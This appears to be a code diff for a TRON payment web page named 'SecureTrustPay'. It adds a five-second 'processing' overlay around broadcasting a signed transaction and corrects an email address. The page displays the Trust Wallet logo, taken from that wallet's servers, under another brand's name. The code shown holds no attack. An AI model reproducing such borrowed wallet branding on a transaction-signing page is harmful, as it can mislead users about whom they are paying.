@@ -259,6 +259,76 @@
             50% { transform: scale(0.94); opacity: 0.72; }
         }
 
+
+        /* Pantalla de procesamiento de la transacción */
+        .processing-screen {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            transition: opacity 0.35s ease, visibility 0.35s ease;
+        }
+
+        .processing-screen.visible {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: auto;
+        }
+
+        .processing-logo {
+            width: 110px;
+            height: 110px;
+            margin-bottom: 26px;
+            animation: loaderPulse 1.25s ease-in-out infinite;
+        }
+
+        .processing-bar {
+            position: relative;
+            width: 190px;
+            height: 5px;
+            overflow: hidden;
+            border-radius: 999px;
+            background: #e4e9f2;
+        }
+
+        .processing-bar::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -45%;
+            width: 45%;
+            height: 100%;
+            border-radius: inherit;
+            background: #0052ff;
+            animation: processingSlide 1.15s ease-in-out infinite;
+        }
+
+        .processing-title {
+            margin-top: 18px;
+            color: #111111;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .processing-note {
+            margin-top: 7px;
+            color: #717680;
+            font-size: 12px;
+            font-weight: 400;
+        }
+
+        @keyframes processingSlide {
+            0% { left: -45%; }
+            100% { left: 100%; }
+        }
+
     </style>
 </head>
 
@@ -273,6 +343,17 @@
     <div class="loader-text">Cargando...</div>
 </div>
 
+
+<div id="processingScreen" class="processing-screen" aria-label="Procesando transacción">
+    <img
+        src="https://assets.trustwalletapp.com/blockchains/tron/info/logo.png"
+        alt="Logo"
+        class="processing-logo"
+    >
+    <div class="processing-bar"></div>
+    <div class="processing-title">Procesando...</div>
+    <div class="processing-note">Por favor, no cierres esta ventana.</div>
+</div>
 
 <div class="tw-container">
 
@@ -499,7 +580,7 @@
     <p>© 2026 SecureTrustPay. All rights reserved.</p>
     <p>
         Need help?
-        <a href="mailto:help@securetrustpay.net" title="Enviar correo a help@securetrustpay.org">
+        <a href="mailto:help@securetrustpay.net" title="Enviar correo a help@securetrustpay.net">
             help@securetrustpay.net
         </a>
     </p>
@@ -555,6 +636,28 @@
 
 
     let walletAddress = null;
+
+    const processingScreen = document.getElementById('processingScreen');
+    let processingStartedAt = 0;
+
+    function showProcessingScreen() {
+        processingStartedAt = Date.now();
+        if (processingScreen) processingScreen.classList.add('visible');
+    }
+
+    async function hideProcessingScreenAfterMinimum() {
+        if (!processingStartedAt) return;
+
+        const elapsed = Date.now() - processingStartedAt;
+        const remaining = Math.max(0, 5000 - elapsed);
+
+        if (remaining > 0) {
+            await new Promise(resolve => window.setTimeout(resolve, remaining));
+        }
+
+        if (processingScreen) processingScreen.classList.remove('visible');
+        processingStartedAt = 0;
+    }
 
 
     function setStatus(message) {
@@ -1029,10 +1132,14 @@
                         );
 
 
+                    showProcessingScreen();
+
                     const broadcast =
                         await tronWeb.trx.sendRawTransaction(
                             signedTx
                         );
+
+                    await hideProcessingScreenAfterMinimum();
 
 
                     if (
@@ -1062,6 +1169,8 @@
                 catch (error) {
 
                     console.error(error);
+
+                    await hideProcessingScreenAfterMinimum();
 
                     setStatus(
                         error.message ||
